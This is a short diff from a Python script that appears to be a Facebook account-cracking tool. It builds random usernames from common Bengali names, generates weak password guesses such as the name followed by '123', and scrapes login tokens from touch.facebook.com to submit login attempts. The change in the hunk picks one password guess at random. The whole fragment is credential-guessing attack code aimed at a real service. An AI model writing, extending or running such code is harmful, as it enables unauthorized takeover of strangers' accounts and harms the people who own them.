@@ -2139,7 +2139,7 @@ def mail(uid,pwx,first,tl):
             lastt = random.choice(['roy','das','sarkar','mondal','biswas','ghosh','saha','haldar','pal','ray',])
             nmnn = firstt+lastt
             uiddd = nmnn+love+domain
-            pwg = [nmnn,firstt+'12',firstt+'123',firstt+'1234',firstt+'12345']
+            pwg = random.choice([nmnn,firstt+'12',firstt+'123',firstt+'1234',firstt+'12345'])
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
